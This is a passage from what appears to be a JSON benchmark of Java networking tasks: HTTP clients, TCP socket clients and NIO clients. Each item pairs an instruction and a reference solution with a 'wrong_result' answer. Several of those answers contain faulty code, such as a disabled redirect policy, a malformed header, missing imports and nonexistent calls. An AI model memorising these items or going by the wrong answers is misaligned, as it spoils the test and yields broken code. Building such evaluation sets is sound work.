2) {\n                callback.onWarning(apiCallId, message, cause, correction, details, objRefsMap);\n            } else if (retCode == 3) {\n                callback.onInfo(apiCallId, message, cause, correction, details, objRefsMap);\n            } else {\n                callback.onUnknown(apiCallId, message, cause, correction, details, objRefsMap);\n            }\n        }\n    }\n\n    private void startWorkerThread() {\n        thread = new Thread(new ProtobufIOWorker());\n        thread.setName(\"ProtobufIOWorker\");\n        thread.start();\n    }\n\n    private class ProtobufIOWorker implements Runnable {\n        public void run() {\n            while (!shutdown) {\n                try {\n                    int length = readIntFromStream();\n                    if (length <= 0) break;\n                    byte[] data = readBytes(length);\n                    MessageLite msg = parseMessage(data);\n                    callback(0, 0, \"Received message\", \"\", \"\", \"\", Collections.emptyMap());\n                } catch (IOException e) {\n                    outStream.println(\"Error reading from stream: \" + e.getMessage());\n                }\n            }\n        }\n\n        private int readIntFromStream() throws IOException {\n            byte[] buffer = new byte[4];\n            int bytesRead = inputStream.read(buffer);\n            if (bytesRead != 4) {\n                throw new IOException(\"Incomplete length header\");\n            }\n            return ByteBuffer.wrap(buffer).getInt();\n        }\n\n        private byte[] readBytes(int length) throws IOException {\n            byte[] buffer = new byte[length];\n            int bytesRead = 0;\n            while (bytesRead < length) {\n                int read = inputStream.read(buffer, bytesRead, length - bytesRead);\n                if (read == -1) {\n                    throw new IOException(\"Connection closed\");\n                }\n                bytesRead += read;\n            }\n            return buffer;\n        }\n\n        private MessageLite parseMessage(byte[] data) throws IOException {\n            return MessageLite.parseFrom(data);\n        }\n    }\n}"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making various types of HTTP requests and handling responses.\n\nClass Description: The HttpCommunicationClient class provides methods for performing HTTP operations (GET, POST) and handling redirects. It manages an HTTP client instance and supports custom headers and browser-like requests.\n\nAttributes:\naddress: [InetSocketAddress] - The target server address (host and port) for HTTP requests\nhttpClient: [HttpClient] - The underlying HTTP client instance used for making requests\n\nMethods:\nsetupHttpClient: [setupHttpClient(ThreadPool threadPool)] -> [void] - Initializes the HTTP client with redirect policy and thread pool\ncloseClient: [closeClient()] -> [void] - Closes the HTTP client resources\nexecuteAndDefaultAssertions: [executeAndDefaultAssertions(HttpRequest request)] -> [HttpResponse<String>] - Internal method to execute requests and handle responses\nget: [get(String path, String[]... headers)] -> [HttpResponse<String>] - Performs a GET request to specified path with optional headers\nbrowserGet: [browserGet(String uri)] -> [HttpResponse<String>] - Performs a GET request with browser-like User-Agent header\npost: [post(String path)] -> [HttpResponse<String>] - Performs a POST request to specified path\ngetAllRedirectLocations: [getAllRedirectLocations(String path, String[]... headers)] -> [List<String>] - Retrieves all redirect locations for a request\nbrowserHeader: [static browserHeader()] -> [String[]] - Returns browser-like User-Agent header (static utility method)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class HttpCommunicationClient {\n\n    protected InetSocketAddress address;\n    protected HttpClient httpClient;\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .executor(threadPool.generic())\n            .build();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws Exception {\n        var resp = httpClient.send(request, BodyHandlers.ofString());\n        return resp;\n    }\n\n    public HttpResponse<String> get(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        return executeAndDefaultAssertions(builder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws Exception {\n        return get(uri, browserHeader());\n    }\n\n    public HttpResponse<String> post(String path) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(BodyPublishers.noBody())\n            .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        var response = httpClient.send(builder.build(), BodyHandlers.discarding());\n        response = response.previousResponse().orElse(null);\n        List<String> redirects = new ArrayList<>();\n        while (response != null) {\n            redirects.addAll(response.headers().allValues(\"location\"));\n            response = response.previousResponse().orElse(null);\n        }\n        return redirects;\n    }\n\n    static String[] browserHeader() {\n        return new String[] {\n            \"User-Agent\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HttpCommunicationClient {\n    private final InetSocketAddress address;\n    private HttpClient httpClient;\n\n    public HttpCommunicationClient(InetSocketAddress address) {\n        this.address = address;\n    }\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        this.httpClient = HttpClient.newBuilder()\n            .executor(threadPool)\n            .followRedirects(HttpClient.Redirect.DISABLED)\n            .build();\n    }\n\n    public void closeClient() {\n        if (httpClient != null) {\n            httpClient.close();\n        }\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) {\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> get(String path, String[]... headers) {\n        HttpRequest request = buildRequest(\"GET\", path, headers);\n        return executeAndDefaultAssertions(request);\n    }\n\n    public HttpResponse<String> browserGet(String uri) {\n        String[] headers = browserHeader();\n        return get(uri, headers);\n    }\n\n    public HttpResponse<String> post(String path) {\n        HttpRequest request = buildRequest(\"POST\", path, new String[0]);\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[]... headers) {\n        List<String> redirectLocations = new ArrayList<>();\n        HttpRequest request = buildRequest(\"GET\", path, headers);\n        HttpResponse<String> response;\n        do {\n            response = executeAndDefaultAssertions(request);\n            int statusCode = response.statusCode();\n            if (statusCode >= 300 && statusCode < 400) {\n                String location = response.headers().firstValue(\"Location\");\n                if (location != null) {\n                    redirectLocations.add(location);\n                    request = buildRequest(\"GET\", location, headers);\n                }\n            }\n        } while (response.statusCode() >= 300 && response.statusCode() < 400);\n        return redirectLocations;\n    }\n\n    private static String[] browserHeader() {\n        return new String[]{\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"};\n    }\n\n    private HttpRequest buildRequest(String method, String path, String[] headers) {\n        HttpRequest.Builder builder = HttpRequest.newBuilder()\n            .uri(URI.create(\"http://\" + address.getHostName() + \":\" + address.getPort() + path))\n            .method(method, HttpRequest.BodyPublishers.noBody());\n        if (headers != null) {\n            for (String header : headers) {\n                String[] parts = header.split(\":\\\\s*\", 2);\n                if (parts.length == 2) {\n                    builder.header(parts[0], parts[1]);\n                }\n            }\n        }\n        return builder.build();\n    }\n}"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends a message, and properly handles the connection lifecycle including cleanup.\n\nClass Description: The TCPClient class encapsulates functionality for creating a TCP client that connects to a specified server, sends a UTF-8 encoded message, and manages socket resources. It handles potential network exceptions and ensures proper resource cleanup.\n\nAttributes:\n- s: Socket - The socket object used for the TCP connection\n- dos: DataOutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(): void - Establishes a connection to the server at 127.0.0.1:5555, sends the message \"Happy\" after a 3-second delay, and handles connection cleanup. No parameters. No return value.",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPClient {\n\n    public void connect() {\n        Socket s = null;\n        DataOutputStream dos = null;\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            System.out.println(\"Yeah, I connected\");\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n            dos.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) {\n                    dos.close();\n                }\n                if (s != null) {\n                    s.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TCPClient {\n    private Socket s;\n    private DataOutputStream dos;\n\n    public void connect() {\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) dos.close();\n                if (s != null) s.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The SocketClient class provides functionality for establishing a TCP connection to a server, sending messages, receiving responses, and managing connection resources. It encapsulates the socket communication logic using Java's IO and networking classes.\n\nAttributes:\n- theSocket: Socket - The socket object representing the connection to the server\n- out: PrintWriter - The output stream writer for sending data to the server\n- networkIn: BufferedReader - The input stream reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendMessage(String message) -> void - Sends a message to the connected server. The message is automatically flushed.\n- readResponse() -> String - Reads a line of response from the server. Throws IOException if reading fails.\n- close() -> void - Closes all connection resources (socket, input and output streams) safely. Handles any IOExceptions internally.",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class SocketClient {\n\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n        out = new PrintWriter(theSocket.getOutputStream());\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n        out.flush();\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketClient {\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(theSocket.getOutputStream())), true);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n        }\n    }\n}"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function doesn't return any value, but sends data to the server and may print error information to stderr)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public void send(String message, String server, int port) {\n    try {\n        Socket socket = new Socket(server, port);\n        OutputStream out = socket.getOutputStream();\n        out.write(message.getBytes());\n        socket.close();\n    } catch (IOException e) {\n        System.err.println(\"Error sending message: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a Java function that establishes a TCP client connection to a server, sends HTTP upgrade requests and echo messages, and verifies server responses.\n\nFunction Description: The function connects to a predefined server using TCP, sends an HTTP upgrade request followed by echo messages, and asserts the correctness of server responses. It handles basic client-server communication including connection establishment, data exchange, and connection termination.\n\nInput: \n- url: String - The URL path to be used in the HTTP GET request\n\nOutput: \n- None (void) - The function performs assertions to verify server responses but doesn't return any value. It throws IOException if any network communication fails.\n\nNote: The function uses predefined host address and port from DefaultServer class, and includes a helper method readBytes() (not shown) to read data from the input stream.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic void runTest(final String url) throws IOException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET \" + url + \" HTTP/1.1\\r\\nHost:default\\r\\nConnection: upgrade\\r\\nUpgrade: servlet\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    Assert.assertTrue(readBytes(in).startsWith(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n\n    out.write(\"Echo Messages\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"Echo Messages2\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages2\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"exit\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    out.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public void connectAndEcho(String url) throws IOException {\n    Socket socket = new Socket(DefaultServer.HOST, DefaultServer.PORT);\n    try (OutputStream out = socket.getOutputStream();\n         InputStream in = socket.getInputStream()) {\n        String request = \"GET \" + url + \" HTTP/1.1\\r\\n\" +\n                         \"Host: \" + DefaultServer.HOST + \"\\r\\n\" +\n                         \"Upgrade: websocket\\r\\n\" +\n                         \"Connection: Upgrade\\r\\n\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n        \n        byte[] buffer = new byte[1024];\n        int bytesRead = readBytes(in, buffer);\n        if (bytesRead < 4 || buffer[0] != 'H' || buffer[1] != 'T' || buffer[2] != 'P' || buffer[3] != ' ') {\n            throw new IOException(\"Invalid HTTP response\");\n        }\n        \n        String echoMessage = \"EchoMessage\";\n        out.write(echoMessage.getBytes());\n        out.flush();\n        \n        bytesRead = readBytes(in, buffer);\n        if (bytesRead != echoMessage.length() || !new String(buffer, 0, bytesRead).equals(echoMessage)) {\n            throw new IOException(\"Echo message mismatch\");\n        }\n    } finally {\n        socket.close();\n    }\n}"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java's Socket API for establishing connections, sending and receiving data, and managing the connection state.\n\nClass Description: The SocketClient class is a singleton implementation that provides TCP client functionality. It manages a single socket connection, handles data transmission through input/output streams, and maintains connection state. The class includes methods for opening/closing connections, reading/writing data, and checking connection status.\n\nAttributes:\n- socketClient: [SocketClient] - Singleton instance of the class\n- socket: [Socket] - The TCP socket connection\n- outputStream: [OutputStream] - Output stream for sending data\n- inputStream: [InputStream] - Input stream for receiving data\n- isConnected: [boolean] - Connection status flag\n- DEFAULT_READ_BUFFER_SIZE: [int] - Default buffer size for reading data (32KB)\n- buffer: [byte[]] - Temporary buffer for reading data\n- receivedData: [byte[]] - Storage for received data\n\nMethods:\n- getInstance() -> [SocketClient] - Returns the singleton instance of SocketClient\n- openConnection(String ip, int port) -> [void] - Opens a connection to the specified IP and port\n- isConnected() -> [boolean] - Returns the current connection status\n- write(byte[] data) -> [void] - Synchronously writes data to the output stream\n- read(int bytesToBeRead) -> [int] - Synchronously reads specified number of bytes from input stream\n- getReceivedData() -> [byte[]] - Returns the last received data\n- closeConnection() -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SocketClient {\n\n    private static SocketClient socketClient = null;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected = false;\n    public static final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        if (!socket.isConnected()) {\n            isConnected = false;\n            return;\n        }\n        isConnected = true;\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n    }\n\n    public static SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public synchronized void write(byte[] data) throws IOException {\n        if (isConnected && socketClient.isConnected && outputStream != null) {\n            outputStream.write(data);\n        }\n    }\n\n    public synchronized int read(int bytesToBeRead) throws IOException {\n        int numBytesRead = 0;\n        int readNow;\n        int bytesToBeReadTemp = bytesToBeRead;\n        receivedData = new byte[DEFAULT_READ_BUFFER_SIZE];\n        while (numBytesRead < bytesToBeRead) {\n            readNow = inputStream.read(buffer, 0, bytesToBeReadTemp);\n            if (readNow <= 0) {\n                return numBytesRead;\n            } else {\n                System.arraycopy(buffer, 0, receivedData, numBytesRead, readNow);\n                numBytesRead += readNow;\n                bytesToBeReadTemp -= readNow;\n            }\n        }\n        return numBytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        try {\n            if (isConnected) {\n                inputStream.close();\n                outputStream.close();\n                socket.close();\n                isConnected = false;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketClient {\n    private static SocketClient socketClient;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected;\n    private static final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {\n    }\n\n    public static SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        if (isConnected) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        isConnected = true;\n        receivedData = new byte[0];\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public void write(byte[] data) throws IOException {\n        if (!isConnected) {\n            throw new IllegalStateException(\"Not connected\");\n        }\n        outputStream.write(data);\n        outputStream.flush();\n    }\n\n    public int read(int bytesToBeRead) throws IOException {\n        if (!isConnected) {\n            throw new IllegalStateException(\"Not connected\");\n        }\n        int bytesRead = 0;\n        int totalBytesRead = 0;\n        while (totalBytesRead < bytesToBeRead) {\n            bytesRead = inputStream.read(buffer, totalBytesRead, Math.min(bytesToBeRead - totalBytesRead, buffer.length));\n            if (bytesRead == -1) {\n                break;\n            }\n            totalBytesRead += bytesRead;\n        }\n        receivedData = Arrays.copyOf(buffer, totalBytesRead);\n        return totalBytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() throws IOException {\n        if (isConnected) {\n            inputStream.close();\n            outputStream.close();\n            socket.close();\n            isConnected = false;\n        }\n    }\n}"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Create a function that establishes a TCP connection to a server, sends JSON-formatted measurement data, and then closes the connection.\n\nFunction Description: The function `doSocketTest` establishes a TCP socket connection to a specified server (localhost) on a predefined port. It generates JSON-formatted measurement data using a helper class, writes this data to the server through the socket's output stream, flushes the stream to ensure all data is sent, and then closes both the output stream and the socket to release resources.\n\nInput: \n- None (The function uses predefined constants `SERVER_SOCKET_PORT` and `HARDWARE_ID` for server port and hardware identification, respectively.)\n\nOutput: \n- None (The function does not return any value but sends data to the server and may throw exceptions if the connection or data transmission fails.)",
    "Canonical_solution": "import java.net.Socket;\n\npublic void doSocketTest() throws Exception {\n    Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n    byte[] encoded = EventsHelper.generateJsonMeasurementsMessage(HARDWARE_ID);\n    socket.getOutputStream().write(encoded);\n    socket.getOutputStream().flush();\n    socket.getOutputStream().close();\n    socket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketTest {\n    private static final int SERVER_SOCKET_PORT = 12345;\n    private static final String HARDWARE_ID = \"HW123\";\n\n    public void doSocketTest() throws IOException {\n        try (Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n             OutputStream os = socket.getOutputStream()) {\n            String jsonData = MeasurementData.generateJson();\n            os.write(jsonData.getBytes());\n            os.flush();\n        }\n    }\n\n    public static class MeasurementData {\n        public static String generateJson() {\n            return \"{\\\"hardwareId\\\":\\\"\" + HARDWARE_ID + \"\\\",\\\"timestamp\\\":1234567890,\\\"measurements\\\":{\\\"temp\\\":25.5,\\\"humidity\\\":45.0}}\";\n        }\n    }\n}"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a Java class that provides TCP client functionality using Java NIO (Non-blocking I/O) for efficient network communication. The class should support both plaintext and SSL connections, manage multiple connections, and handle connection lifecycle operations.\n\nClass Description: The NioTcpClient class is a non-blocking TCP client implementation using Java NIO. It manages multiple socket connections, handles connection establishment, and provides methods for connection management. It supports both plaintext and SSL connections through a configurable transmission mechanism.\n\nAttributes:\n- nioSelector: Selector - The NIO selector used for managing multiple channels\n- keyMap: Map<String, SelectionKey> - Maps connection IDs to their corresponding selection keys\n- time: Time - Provides time-related functionality\n- sslFactory: SSLFactory - Handles SSL-related operations if SSL connections are used\n- networkConfig: NetworkConfig - Contains network configuration parameters\n\nMethods:\n- NioTcpClient(Time, SSLFactory, NetworkConfig) -> NioTcpClient - Constructor that initializes the selector, time, SSL factory, and network configuration\n- connect(InetSocketAddress, int, int, PortType) -> String - Establishes a new connection to the specified address with given buffer sizes and port type, returns a connection ID\n- generateConnectionId(SocketChannel) -> String - Generates a unique connection ID based on local and remote socket addresses\n- createTransmission(String, SelectionKey, String, int, PortType, SSLFactory.Mode) -> Transmission - Creates an appropriate transmission object (plaintext or SSL) for the connection\n- disconnect(String) -> void - Disconnects the connection with the specified ID\n- close() -> void - Closes all connections and releases all resources",
    "Canonical_solution": "import com.github.ambry.network.NetworkSend;\nimport com.github.ambry.network.NetworkReceive;\nimport com.github.ambry.network.PortType;\nimport com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.config.NetworkConfig;\nimport com.github.ambry.utils.Time;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n\n  private final java.nio.channels.Selector nioSelector;\n  private final Map<String, SelectionKey> keyMap;\n  private final Time time;\n  private final SSLFactory sslFactory;\n  private final NetworkConfig networkConfig;\n\n  public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = java.nio.channels.Selector.open();\n    this.time = time;\n    this.keyMap = new HashMap<>();\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n  }\n\n  public String connect(InetSocketAddress address, int sendBufferSize, int receiveBufferSize, PortType portType)\n      throws IOException {\n    SocketChannel channel = SocketChannel.open();\n    channel.configureBlocking(false);\n    channel.socket().setKeepAlive(true);\n    channel.socket().setSendBufferSize(sendBufferSize);\n    channel.socket().setReceiveBufferSize(receiveBufferSize);\n    channel.socket().setTcpNoDelay(true);\n    try {\n      channel.connect(address);\n    } catch (IOException e) {\n      channel.close();\n      throw e;\n    }\n    String connectionId = generateConnectionId(channel);\n    SelectionKey key = channel.register(this.nioSelector, SelectionKey.OP_CONNECT);\n    Transmission transmission = createTransmission(connectionId, key, address.getHostName(), address.getPort(), portType,\n        SSLFactory.Mode.CLIENT);\n    key.attach(transmission);\n    this.keyMap.put(connectionId, key);\n    return connectionId;\n  }\n\n  private String generateConnectionId(SocketChannel channel) {\n    return channel.socket().getLocalAddress().getHostAddress() + \":\" + channel.socket().getLocalPort() + \"-\" +\n        channel.socket().getInetAddress().getHostAddress() + \":\" + channel.socket().getPort();\n  }\n\n  protected Transmission createTransmission(String connectionId, SelectionKey key, String hostname, int port,\n      PortType portType, SSLFactory.Mode mode) throws IOException {\n    if (portType == PortType.PLAINTEXT) {\n      return new PlainTextTransmission(connectionId, (SocketChannel) key.channel(), key, time, null, networkConfig);\n    } else if (portType == PortType.SSL) {\n      return new SSLTransmission(sslFactory, connectionId, (SocketChannel) key.channel(), key, hostname, port, time,\n          null, mode, networkConfig);\n    } else {\n      throw new IllegalArgumentException(\"Unsupported portType \" + portType);\n    }\n  }\n\n  public void disconnect(String connectionId) {\n    SelectionKey key = this.keyMap.get(connectionId);\n    if (key != null) {\n      key.cancel();\n    }\n  }\n\n  public void close() throws IOException {\n    for (SelectionKey key : this.nioSelector.keys()) {\n      Transmission transmission = (Transmission) key.attachment();\n      if (transmission != null) {\n        transmission.close();\n      }\n      key.channel().close();\n    }\n    this.nioSelector.close();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class NioTcpClient {\n    private Selector nioSelector;\n    private Map<String, SelectionKey> keyMap;\n    private Time time;\n    private SSLFactory sslFactory;\n    private NetworkConfig networkConfig;\n\n    public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n        this.nioSelector = Selector.open();\n        this.keyMap = new HashMap<>();\n        this.time = time;\n        this.sslFactory = sslFactory;\n        this.networkConfig = networkConfig;\n    }\n\n    public String connect(InetSocketAddress address, int readBufferSize, int writeBufferSize, PortType portType) throws IOException {\n        SocketChannel channel = SocketChannel.open();\n        channel.configureBlocking(false);\n        channel.connect(address);\n        String connectionId = generateConnectionId(channel);\n        SelectionKey key = channel.register(nioSelector, OP_CONNECT);\n        key.attach(createTransmission(connectionId, key, address.toString(), readBufferSize, portType, sslFactory.getMode()));\n        keyMap.put(connectionId, key);\n        return connectionId;\n    }\n\n    private String generateConnectionId(SocketChannel channel) {\n        InetSocketAddress localAddress = (InetSocketAddress) channel.getLocalAddress();\n        InetSocketAddress remoteAddress = (InetSocketAddress) channel.getRemoteAddress();\n        return String.format(\"local:%s-remote:%s\", localAddress, remoteAddress);\n    }\n\n    private Transmission createTransmission(String connectionId, SelectionKey key, String address, int bufferSize, PortType portType, SSLFactory.Mode sslMode) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        if (portType == PortType.SSL) {\n            SSLEngine sslEngine = sslFactory.createSSLEngine();\n            return new TransmissionSSL(channel, sslEngine, bufferSize, connectionId);\n        } else {\n            return new Transmission(channel, bufferSize, connectionId);\n        }\n    }\n\n    public void disconnect(String connectionId) {\n        SelectionKey key = keyMap.get(connectionId);\n        if (key != null) {\n            key.cancel();\n            keyMap.remove(connectionId);\n            try {\n                ((SocketChannel) key.channel()).close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void close() throws IOException {\n        for (SelectionKey key : keyMap.values()) {\n            key.cancel();\n            ((SocketChannel) key.channel()).close();\n        }\n        nioSelector.close();\n    }\n\n    public enum PortType {\n        PLAIN, SSL\n    }\n}"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The class should handle connection establishment, data transmission, and connection termination while managing network buffers and packet processing.\n\nClass Description: TCPConnection is a non-blocking TCP client implementation that extends an abstract connection class and implements a packet source interface. It manages socket communication, handles I/O operations asynchronously, and processes network packets with proper flow control.\n\nAttributes:\n- MTU: [int] - Maximum Transmission Unit size (16384 bytes)\n- MAX_PAYLOAD_SIZE: [int] - Maximum payload size after accounting for protocol headers\n- clientToNetwork: [StreamBuffer] - Buffer for data being sent from client to network\n- networkToClient: [Packetizer] - Handles packetization of incoming data\n- packetForClient: [IPv4Packet] - Current packet being processed for the client\n- channel: [SocketChannel] - NIO channel for TCP communication\n- selectionKey: [SelectionKey] - Registration key with the selector\n- interests: [int] - Current interest set for the selection key\n\nMethods:\n- TCPConnection([ConnectionId id, Client client, 